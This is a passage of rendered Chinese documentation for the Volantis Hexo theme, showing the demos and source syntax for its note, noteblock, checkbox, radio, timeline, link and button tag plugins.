title="演示效果"></a>演示效果</h3><h4 id="彩色文字-1"><a href="#彩色文字-1" class="headerlink" title="彩色文字"></a>彩色文字</h4><p>在一段话中方便插入各种颜色的标签，包括：<p class='p red'>红色</p>、<p class='p yellow'>黄色</p>、<p class='p green'>绿色</p>、<p class='p cyan'>青色</p>、<p class='p blue'>蓝色</p>、<p class='p gray'>灰色</p>。</p><h4 id="超大号文字-1"><a href="#超大号文字-1" class="headerlink" title="超大号文字"></a>超大号文字</h4><p>文档「开始」页面中的标题部分就是超大号文字。</p><p class='p center logo large'>Volantis</p><p class='p center small'>A Wonderful Theme for Hexo</p><h3 id="上述示例的源码-1"><a href="#上述示例的源码-1" class="headerlink" title="上述示例的源码"></a>上述示例的源码</h3><figure class="highlight md"><figcaption><span>example:</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">#### 彩色文字</span></span><br><span class="line"></span><br><span class="line">在一段话中方便插入各种颜色的标签，包括：&#123;% p red, 红色 %&#125;、&#123;% p yellow, 黄色 %&#125;、&#123;% p green, 绿色 %&#125;、&#123;% p cyan, 青色 %&#125;、&#123;% p blue, 蓝色 %&#125;、&#123;% p gray, 灰色 %&#125;。</span><br><span class="line"></span><br><span class="line"><span class="section">#### 超大号文字</span></span><br><span class="line"></span><br><span class="line">文档「开始」页面中的标题部分就是超大号文字。</span><br><span class="line"></span><br><span class="line">&#123;% p center logo large, Volantis %&#125;</span><br><span class="line">&#123;% p center small, A Wonderful Theme for Hexo %&#125;</span><br></pre></td></tr></table></figure><h3 id="可以支持的参数-1"><a href="#可以支持的参数-1" class="headerlink" title="可以支持的参数"></a>可以支持的参数</h3><p>样式参数位置可以写颜色、大小和对齐方向，多个样式参数用空格隔开。</p><h4 id="字体-1"><a href="#字体-1" class="headerlink" title="字体"></a>字体</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">logo, code</span><br></pre></td></tr></table></figure><h4 id="颜色-1"><a href="#颜色-1" class="headerlink" title="颜色"></a>颜色</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">red, yellow, green, cyan, blue, gray</span><br></pre></td></tr></table></figure><h4 id="大小-1"><a href="#大小-1" class="headerlink" title="大小"></a>大小</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">small, h4, h3, h2, h1, large, huge, ultra</span><br></pre></td></tr></table></figure><h4 id="对齐方向-1"><a href="#对齐方向-1" class="headerlink" title="对齐方向"></a>对齐方向</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">left, center, right</span><br></pre></td></tr></table></figure><br><h2 id="note"><a href="#note" class="headerlink" title="note"></a>note</h2><p>NoteBlock 是 Blockquote 的增强版，在左边显示图标，并且可以自定颜色。而 Note 是 NoteBlock 的简便写法。</p><figure class="highlight md"><figcaption><span>最后更新于 <u>2.3</u> 版本</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% note 样式参数, 文本内容 %&#125;</span><br></pre></td></tr></table></figure><h3 id="演示效果-1"><a href="#演示效果-1" class="headerlink" title="演示效果"></a>演示效果</h3><h4 id="经典用法"><a href="#经典用法" class="headerlink" title="经典用法"></a>经典用法</h4><div class="note "><p>可以在配置文件中设置默认样式，为简单的一句话提供最的简便写法。</p></div><div class="note quote"><p>note quote 适合引用一段话</p></div><div class="note info"><p>note info 默认主题色，适合中性的信息</p></div><div class="note warning"><p>note warning 默认黄色，适合警告性的信息</p></div><div class="note danger"><p>note error/danger 默认红色，适合危险性的信息</p></div><div class="note success"><p>note done/success 默认绿色，适合正确操作的信息</p></div><h4 id="更多图标"><a href="#更多图标" class="headerlink" title="更多图标"></a>更多图标</h4><p>这些都是默认样式，可以手动加上颜色：</p><div class="note radiation"><p>note radiation 默认样式</p></div><div class="note radiation yellow"><p>note radiation yellow 可以加上颜色</p></div><div class="note bug red"><p>note bug red 说明还存在的一些故障</p></div><div class="note link green"><p>note link green 可以放置一些链接</p></div><div class="note paperclip blue"><p>note paperclip blue 放置一些附件链接</p></div><div class="note todo"><p>note todo 待办事项</p></div><div class="note guide clear"><p>note guide clear 可以加上一段向导</p></div><div class="note download"><p>note download 可以放置下载链接</p></div><div class="note message gray"><p>note message gray 一段消息</p></div><div class="note up"><p>note up 可以说明如何进行更新</p></div><div class="note undo light"><p>note undo light 可以说明如何撤销或者回退</p></div><h3 id="上述示例的源码-2"><a href="#上述示例的源码-2" class="headerlink" title="上述示例的源码"></a>上述示例的源码</h3><figure class="highlight md"><figcaption><span>example:</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">#### 经典用法</span></span><br><span class="line"></span><br><span class="line">&#123;% note, 可以在配置文件中设置默认样式，为简单的一句话提供最的简便写法。 %&#125;</span><br><span class="line">&#123;% note quote, note quote 适合引用一段话 %&#125;</span><br><span class="line">&#123;% note info, note info 默认主题色，适合中性的信息 %&#125;</span><br><span class="line">&#123;% note warning, note warning 默认黄色，适合警告性的信息 %&#125;</span><br><span class="line">&#123;% note danger, note error/danger 默认红色，适合危险性的信息 %&#125;</span><br><span class="line">&#123;% note success, note done/success 默认绿色，适合正确操作的信息 %&#125;</span><br><span class="line"></span><br><span class="line"><span class="section">#### 更多图标</span></span><br><span class="line"></span><br><span class="line">这些都是默认样式，可以手动加上颜色：</span><br><span class="line"></span><br><span class="line">&#123;% note radiation, note radiation 默认样式 %&#125;</span><br><span class="line">&#123;% note radiation yellow, note radiation yellow 可以加上颜色 %&#125;</span><br><span class="line">&#123;% note bug red, note bug red 说明还存在的一些故障 %&#125;</span><br><span class="line">&#123;% note link green, note link green 可以放置一些链接 %&#125;</span><br><span class="line">&#123;% note paperclip blue, note paperclip blue 放置一些附件链接 %&#125;</span><br><span class="line">&#123;% note todo, note todo 待办事项 %&#125;</span><br><span class="line">&#123;% note guide clear, note guide clear 可以加上一段向导 %&#125;</span><br><span class="line">&#123;% note download, note download 可以放置下载链接 %&#125;</span><br><span class="line">&#123;% note message gray, note message gray 一段消息 %&#125;</span><br><span class="line">&#123;% note up, note up 可以说明如何进行更新 %&#125;</span><br><span class="line">&#123;% note undo light, note undo light 可以说明如何撤销或者回退 %&#125;</span><br></pre></td></tr></table></figure><h3 id="可以支持的参数-2"><a href="#可以支持的参数-2" class="headerlink" title="可以支持的参数"></a>可以支持的参数</h3><p>样式参数位置可以写图标和颜色，多个样式参数用空格隔开。</p><h4 id="图标"><a href="#图标" class="headerlink" title="图标"></a>图标</h4><figure class="highlight md"><figcaption><span>彩色的</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">quote, info, warning, done/success, error/danger</span><br></pre></td></tr></table></figure><figure class="highlight md"><figcaption><span>灰色的，也可以指定颜色</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">radiation, bug, idea, link, paperclip, todo, message, guide, download, up, undo</span><br></pre></td></tr></table></figure><h4 id="颜色-2"><a href="#颜色-2" class="headerlink" title="颜色"></a>颜色</h4><figure class="highlight md"><figcaption><span>指定颜色</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">clear, light, gray, red, yellow, green, cyan, blue</span><br></pre></td></tr></table></figure><br><h2 id="noteblock"><a href="#noteblock" class="headerlink" title="noteblock"></a>noteblock</h2><p>NoteBlock 是 Blockquote 的增强版，在左边显示图标，并且可以自定颜色。而 Note 是 NoteBlock 的简便写法。</p><figure class="highlight md"><figcaption><span>最后更新于 <u>4.0</u> 版本</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% noteblock 样式参数（可选）, 标题（可选） %&#125;</span><br><span class="line">文本段落</span><br><span class="line">&#123;% endnoteblock %&#125;</span><br></pre></td></tr></table></figure><h3 id="演示效果-2"><a href="#演示效果-2" class="headerlink" title="演示效果"></a>演示效果</h3><p>可以在区块中放置一些复杂的结构，支持嵌套。</p><div class="note "><p><strong>标题（可选）</strong></p><p>Windows 10不是為所有人設計,而是為每個人設計</p><div class="note done"><p>嵌套测试： 请坐和放宽，我正在帮你搞定一切…</p></div><details yellow><summary> Folding 测试： 点击查看更多 </summary>              <div class='content'>              <div class="note warning"><p>不要说我们没有警告过你</p></div><div class="note bug red"><p>我们都有不顺利的时候</p></div>              </div>            </details></div><h3 id="上述示例的源码-3"><a href="#上述示例的源码-3" class="headerlink" title="上述示例的源码"></a>上述示例的源码</h3><figure class="highlight md"><figcaption><span>example:</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&#123;% noteblock, 标题（可选） %&#125;</span><br><span class="line"></span><br><span class="line">Windows 10不是為所有人設計,而是為每個人設計</span><br><span class="line"></span><br><span class="line">&#123;% noteblock done %&#125;</span><br><span class="line">嵌套测试： 请坐和放宽，我正在帮你搞定一切...</span><br><span class="line">&#123;% endnoteblock %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% folding yellow, Folding 测试： 点击查看更多 %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note warning, 不要说我们没有警告过你 %&#125;</span><br><span class="line">&#123;% noteblock bug red %&#125;</span><br><span class="line">我们都有不顺利的时候</span><br><span class="line">&#123;% endnoteblock %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% endfolding %&#125;</span><br><span class="line">&#123;% endnoteblock %&#125;</span><br></pre></td></tr></table></figure><h3 id="可以支持的参数-3"><a href="#可以支持的参数-3" class="headerlink" title="可以支持的参数"></a>可以支持的参数</h3><p>样式参数位置可以写图标和颜色，多个样式参数用空格隔开。</p><h4 id="图标-1"><a href="#图标-1" class="headerlink" title="图标"></a>图标</h4><figure class="highlight md"><figcaption><span>彩色的</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">quote, info, warning, done/success, error/danger</span><br></pre></td></tr></table></figure><figure class="highlight md"><figcaption><span>灰色的，也可以指定颜色</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">radiation, bug, idea, link, paperclip, todo, message, guide, download, up, undo</span><br></pre></td></tr></table></figure><h4 id="颜色-3"><a href="#颜色-3" class="headerlink" title="颜色"></a>颜色</h4><figure class="highlight md"><figcaption><span>指定颜色</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">clear, light, gray, red, yellow, green, cyan, blue</span><br></pre></td></tr></table></figure><br><h2 id="checkbox"><a href="#checkbox" class="headerlink" title="checkbox"></a>checkbox</h2><figure class="highlight md"><figcaption><span>最后更新于 <u>2.6</u> 版本</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% checkbox 样式参数（可选）, 文本（支持简单md） %&#125;</span><br></pre></td></tr></table></figure><h3 id="演示效果-3"><a href="#演示效果-3" class="headerlink" title="演示效果"></a>演示效果</h3><div class='checkbox'><input type="checkbox" />            <p>纯文本测试</p>            </div><div class='checkbox checked'><input type="checkbox" checked="checked"/>            <p>支持简单的 <a href="https://guides.github.com/features/mastering-markdown/">markdown</a> 语法</p>            </div><div class='checkbox red'><input type="checkbox" />            <p>支持自定义颜色</p>            </div><div class='checkbox green checked'><input type="checkbox" checked="checked"/>            <p>绿色 + 默认选中</p>            </div><div class='checkbox yellow checked'><input type="checkbox" checked="checked"/>            <p>黄色 + 默认选中</p>            </div><div class='checkbox cyan checked'><input type="checkbox" checked="checked"/>            <p>青色 + 默认选中</p>            </div><div class='checkbox blue checked'><input type="checkbox" checked="checked"/>            <p>蓝色 + 默认选中</p>            </div><div class='checkbox plus green checked'><input type="checkbox" checked="checked"/>            <p>增加</p>            </div><div class='checkbox minus yellow checked'><input type="checkbox" checked="checked"/>            <p>减少</p>            </div><div class='checkbox times red checked'><input type="checkbox" checked="checked"/>            <p>叉</p>            </div><h3 id="上述示例的源码-4"><a href="#上述示例的源码-4" class="headerlink" title="上述示例的源码"></a>上述示例的源码</h3><figure class="highlight md"><figcaption><span>example:</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;% checkbox 纯文本测试 %&#125;</span><br><span class="line">&#123;% checkbox checked, 支持简单的 [<span class="string">markdown</span>](<span class="link">https://guides.github.com/features/mastering-markdown/</span>) 语法 %&#125;</span><br><span class="line">&#123;% checkbox red, 支持自定义颜色 %&#125;</span><br><span class="line">&#123;% checkbox green checked, 绿色 + 默认选中 %&#125;</span><br><span class="line">&#123;% checkbox yellow checked, 黄色 + 默认选中 %&#125;</span><br><span class="line">&#123;% checkbox cyan checked, 青色 + 默认选中 %&#125;</span><br><span class="line">&#123;% checkbox blue checked, 蓝色 + 默认选中 %&#125;</span><br><span class="line">&#123;% checkbox plus green checked, 增加 %&#125;</span><br><span class="line">&#123;% checkbox minus yellow checked, 减少 %&#125;</span><br><span class="line">&#123;% checkbox times red checked, 叉 %&#125;</span><br></pre></td></tr></table></figure><h3 id="可以支持的参数-4"><a href="#可以支持的参数-4" class="headerlink" title="可以支持的参数"></a>可以支持的参数</h3><h4 id="颜色-4"><a href="#颜色-4" class="headerlink" title="颜色"></a>颜色</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">red, yellow, green, cyan, blue</span><br></pre></td></tr></table></figure><h4 id="样式"><a href="#样式" class="headerlink" title="样式"></a>样式</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">plus, minus, times</span><br></pre></td></tr></table></figure><h4 id="选中状态"><a href="#选中状态" class="headerlink" title="选中状态"></a>选中状态</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">checked</span><br></pre></td></tr></table></figure><br><h2 id="radio"><a href="#radio" class="headerlink" title="radio"></a>radio</h2><figure class="highlight md"><figcaption><span>最后更新于 <u>2.6</u> 版本</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% checkbox 样式参数（可选）, 文本（支持简单md） %&#125;</span><br></pre></td></tr></table></figure><h3 id="演示效果-4"><a href="#演示效果-4" class="headerlink" title="演示效果"></a>演示效果</h3><div class='checkbox'><input type="radio" />            <p>纯文本测试</p>            </div><div class='checkbox checked'><input type="radio" checked="checked"/>            <p>支持简单的 <a href="https://guides.github.com/features/mastering-markdown/">markdown</a> 语法</p>            </div><div class='checkbox red'><input type="radio" />            <p>支持自定义颜色</p>            </div><div class='checkbox green'><input type="radio" />            <p>绿色</p>            </div><div class='checkbox yellow'><input type="radio" />            <p>黄色</p>            </div><div class='checkbox cyan'><input type="radio" />            <p>青色</p>            </div><div class='checkbox blue'><input type="radio" />            <p>蓝色</p>            </div><h3 id="上述示例的源码-5"><a href="#上述示例的源码-5" class="headerlink" title="上述示例的源码"></a>上述示例的源码</h3><figure class="highlight md"><figcaption><span>example:</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;% radio 纯文本测试 %&#125;</span><br><span class="line">&#123;% radio checked, 支持简单的 [<span class="string">markdown</span>](<span class="link">https://guides.github.com/features/mastering-markdown/</span>) 语法 %&#125;</span><br><span class="line">&#123;% radio red, 支持自定义颜色 %&#125;</span><br><span class="line">&#123;% radio green, 绿色 %&#125;</span><br><span class="line">&#123;% radio yellow, 黄色 %&#125;</span><br><span class="line">&#123;% radio cyan, 青色 %&#125;</span><br><span class="line">&#123;% radio blue, 蓝色 %&#125;</span><br></pre></td></tr></table></figure><h3 id="可以支持的参数-5"><a href="#可以支持的参数-5" class="headerlink" title="可以支持的参数"></a>可以支持的参数</h3><h4 id="颜色-5"><a href="#颜色-5" class="headerlink" title="颜色"></a>颜色</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">red, yellow, green, cyan, blue</span><br></pre></td></tr></table></figure><h4 id="选中状态-1"><a href="#选中状态-1" class="headerlink" title="选中状态"></a>选中状态</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">checked</span><br></pre></td></tr></table></figure><br><h2 id="timeline"><a href="#timeline" class="headerlink" title="timeline"></a>timeline</h2><figure class="highlight md"><figcaption><span>最后更新于 <u>3.0</u> 版本</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&#123;% timeline 时间线标题（可选） %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% timenode 时间节点（标题） %&#125;</span><br><span class="line"></span><br><span class="line">正文内容</span><br><span class="line"></span><br><span class="line">&#123;% endtimenode %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% timenode 时间节点（标题） %&#125;</span><br><span class="line"></span><br><span class="line">正文内容</span><br><span class="line"></span><br><span class="line">&#123;% endtimenode %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% endtimeline %&#125;</span><br></pre></td></tr></table></figure><h3 id="演示效果-5"><a href="#演示效果-5" class="headerlink" title="演示效果"></a>演示效果</h3><div class="timeline"><div class="timenode"><div class="meta"><p><p>2020-07-24 <a href="https://github.com/volantis-x/hexo-theme-volantis/releases">2.6.6 -&gt; 3.0</a></p></p></div><div class="body"><ol><li>如果有 <code>hexo-lazyload-image</code> 插件，需要删除并重新安装最新版本，设置 <code>lazyload.isSPA: true</code>。</li><li>2.x 版本的 css 和 js 不适用于 3.x 版本，如果使用了 <code>use_cdn: true</code> 则需要删除。</li><li>2.x 版本的 fancybox 标签在 3.x 版本中被重命名为 gallery 。</li><li>2.x 版本的置顶 <code>top: true</code> 改为了 <code>pin: true</code>，并且同样适用于 <code>layout: page</code> 的页面。</li><li>如果使用了 <code>hexo-offline</code> 插件，建议卸载，3.0 版本默认开启了 pjax 服务。</li></ol></div></div><div class="timenode"><div class="meta"><p><p>2020-05-15 <a href="https://github.com/volantis-x/hexo-theme-volantis/releases/tag/2.6.6">2.6.3 -&gt; 2.6.6</a></p></p></div><div class="body"><p>不需要额外处理。</p></div></div><div class="timenode"><div class="meta"><p><p>2020-04-20 <a href="https://github.com/volantis-x/hexo-theme-volantis/releases/tag/2.6.3">2.6.2 -&gt; 2.6.3</a></p></p></div><div class="body"><ol><li>全局搜索 <code>seotitle</code> 并替换为 <code>seo_title</code>。</li><li>group 组件的索引规则有变，使用 group 组件的文章内，<code>group: group_name</code> 对应的组件名必须是 <code>group_name</code>。</li><li>group 组件的列表名优先显示文章的 <code>short_title</code> 其次是 <code>title</code>。</li></ol></div></div></div><h3 id="上述示例的源码-6"><a href="#上述示例的源码-6" class="headerlink" title="上述示例的源码"></a>上述示例的源码</h3><figure class="highlight md"><figcaption><span>example:</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&#123;% timeline %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% timenode 2020-07-24 [<span class="string">2.6.6 -&gt; 3.0</span>](<span class="link">https://github.com/volantis-x/hexo-theme-volantis/releases</span>) %&#125;</span><br><span class="line"></span><br><span class="line"><span class="bullet">1.</span> 如果有 <span class="code">`hexo-lazyload-image`</span> 插件，需要删除并重新安装最新版本，设置 <span class="code">`lazyload.isSPA: true`</span>。</span><br><span class="line"><span class="bullet">2.</span> 2.x 版本的 css 和 js 不适用于 3.x 版本，如果使用了 <span class="code">`use_cdn: true`</span> 则需要删除。</span><br><span class="line"><span class="bullet">3.</span> 2.x 版本的 fancybox 标签在 3.x 版本中被重命名为 gallery 。</span><br><span class="line"><span class="bullet">4.</span> 2.x 版本的置顶 <span class="code">`top: true`</span> 改为了 <span class="code">`pin: true`</span>，并且同样适用于 <span class="code">`layout: page`</span> 的页面。</span><br><span class="line"><span class="bullet">5.</span> 如果使用了 <span class="code">`hexo-offline`</span> 插件，建议卸载，3.0 版本默认开启了 pjax 服务。</span><br><span class="line"></span><br><span class="line">&#123;% endtimenode %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% timenode 2020-05-15 [<span class="string">2.6.3 -&gt; 2.6.6</span>](<span class="link">https://github.com/volantis-x/hexo-theme-volantis/releases/tag/2.6.6</span>) %&#125;</span><br><span class="line"></span><br><span class="line">不需要额外处理。</span><br><span class="line"></span><br><span class="line">&#123;% endtimenode %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% timenode 2020-04-20 [<span class="string">2.6.2 -&gt; 2.6.3</span>](<span class="link">https://github.com/volantis-x/hexo-theme-volantis/releases/tag/2.6.3</span>) %&#125;</span><br><span class="line"></span><br><span class="line"><span class="bullet">1.</span> 全局搜索 <span class="code">`seotitle`</span> 并替换为 <span class="code">`seo_title`</span>。</span><br><span class="line"><span class="bullet">2.</span> group 组件的索引规则有变，使用 group 组件的文章内，<span class="code">`group: group_name`</span> 对应的组件名必须是 <span class="code">`group_name`</span>。</span><br><span class="line"><span class="bullet">2.</span> group 组件的列表名优先显示文章的 <span class="code">`short_title`</span> 其次是 <span class="code">`title`</span>。</span><br><span class="line"></span><br><span class="line">&#123;% endtimenode %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% endtimeline %&#125;</span><br></pre></td></tr></table></figure><br><h2 id="link"><a href="#link" class="headerlink" title="link"></a>link</h2><figure class="highlight md"><figcaption><span>最后更新于 <u>3.0</u> 版本</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% link 标题, 链接, 图片链接（可选） %&#125;</span><br></pre></td></tr></table></figure><h3 id="演示效果-6"><a href="#演示效果-6" class="headerlink" title="演示效果"></a>演示效果</h3><div class="tag link"><a class="link-card" title="如何参与项目" href="https://volantis.js.org/contributors/"><div class="left"><img src="https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets@master/logo/256/safari.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets@master/logo/256/safari.png" srcset="data:image/png;base64,666"/></div><div class="right"><p class="text">如何参与项目</p><p class="url">https://volantis.js.org/contributors/</p></div></a></div><h3 id="上述示例的源码-7"><a href="#上述示例的源码-7" class="headerlink" title="上述示例的源码"></a>上述示例的源码</h3><figure class="highlight md"><figcaption><span>example:</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% link 如何参与项目, https://volantis.js.org/contributors/, https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets@master/logo/256/safari.png %&#125;</span><br></pre></td></tr></table></figure><br><h2 id="button"><a href="#button" class="headerlink" title="button"></a>button</h2><div class="note warning"><p>这个页面的标签将会在不久后重构</p></div><h3 id="基础按钮"><a href="#基础按钮" class="headerlink" title="基础按钮"></a>基础按钮</h3><p>请将您的 Volantis 升级至 <u>2.4</u> 版本以上使用。</p><div class="tabs" id="btn"><ul class="nav-tabs"><li class="tab"><a class="#btn-1">语法格式</a></li><li class="tab"><a class="#btn-2">参数列表</a></li><li class="tab"><a class="#btn-3">示例写法</a></li><li class="tab active"><a class="#btn-4">示例效果</a></li></ul><div class="tab-content"><div class="tab-pane" id="btn-1"><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% btn 样式参数（可选）, 标题, 链接, 图标（可选） %&#125;</span><br></pre></td></tr></table></figure><div class="note warning"><p>可选的参数可以省略，但是前后顺序不能乱。</p></div></div><div class="tab-pane" id="btn-2"><p class='p subtitle'>样式参数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">regular, large, center</span><br></pre></td></tr></table></figure><p class='p subtitle'>图标</p><p>第1个或者第2个参数包含 <code>fa-</code> 的那个被识别为图标。</p></div><div class="tab-pane" id="btn-3"><figure class="highlight md"><figcaption><span>example.md:</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">不设置任何参数的 &#123;% btn 按钮, / %&#125; 适合融入段落中。</span><br><span class="line"></span><br><span class="line">regular 按钮适合独立于段落之外：</span><br><span class="line"></span><br><span class="line">&#123;% btn regular, 示例博客, https://xaoxuu.com, fas fa-play-circle %&#125;</span><br><span class="line"></span><br><span class="line">large 按钮更具有强调作用，建议搭配 center 使用：</span><br><span class="line"></span><br><span class="line">&#123;% btn center large, 开始使用, https://volantis.js.org/v3/getting-started/, fas fa-download %&#125;</span><br></pre></td></tr></table></figure></div><div class="tab-pane active" id="btn-4"><p class='p subtitle'>行内按钮</p><p>不设置任何参数的 <span class='btn'><a class="button" href='/' title='按钮'>按钮</a></span> 适合融入段落中。</p><p class='p subtitle'>空心按钮</p><p><span class='btn regular'><a class="button" href='/' title='示例博客'><i class='fas fa-rss'></i>示例博客</a></span> <span class='btn regular'><a class="button"  title='示例博客'><i class='fas fa-rss'></i>示例博客</a></span></p><p><span class='btn regular large'><a class="button" href='/' title='示例博客'><i class='fas fa-rss'></i>示例博客</a></span> <span class='btn regular large'><a class="button"  title='示例博客'><i class='fas fa-rss'></i>示例博客</a></span></p><p>居中：</p><p><span class='btn center large'><a class="button" href='https://volantis.js.org/v3/getting-started/' title='开始使用'><i class='fas fa-download'></i>开始使用</a></span></p><p class='p subtitle'>实心按钮</p><p><span class='btn solid'><a class="button" href='/' title='示例博客'><i class='fas fa-rss'></i>示例博客</a></span> <span class='btn solid'><a class="button"  title='示例博客'><i class='fas fa-rss'></i>示例博客</a></span></p><p><span class='btn solid large'><a class="button" href='/' title='示例博客'><i class='fas fa-rss'></i>示例博客</a></span> <span class='btn solid large'><a class="button"  title='示例博客'><i class='fas fa-rss'></i>示例博客</a></span></p><p>居中：</p><p><span class='btn solid center large'><a class="button" href='https://volantis.js.org/v3/getting-started/' title='开始使用'><i class='fas fa-download'></i>开始使用</a></span></p></div></div></div><h3 id="富文本按钮"><a href="#富文本按钮" class="headerlink" title="富文本按钮"></a>富文本按钮</h3><p>请将您的 Volantis 升级至 <u>2.3</u> 版本以上使用。</p><div class="tabs" id="btns"><ul class="nav-tabs"><li class="tab"><a class="#btns-1">语法格式</a></li><li class="tab"><a class="#btns-2">参数列表</a></li><li class="tab"><a class="#btns-3">示例写法</a></li><li class="tab active"><a class="#btns-4">示例效果</a></li></ul><div class="tab-content"><div class="tab-pane" id="btns-1"><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;% btns 样式参数 %&#125;</span><br><span class="line">&#123;% cell 标题, 链接, 图片或者图标 %&#125;</span><br><span class="line">&#123;% cell 标题, 链接, 图片或者图标 %&#125;</span><br><span class="line">&#123;% endbtns %&#125;</span><br></pre></td></tr></table></figure></div><div class="tab-pane" 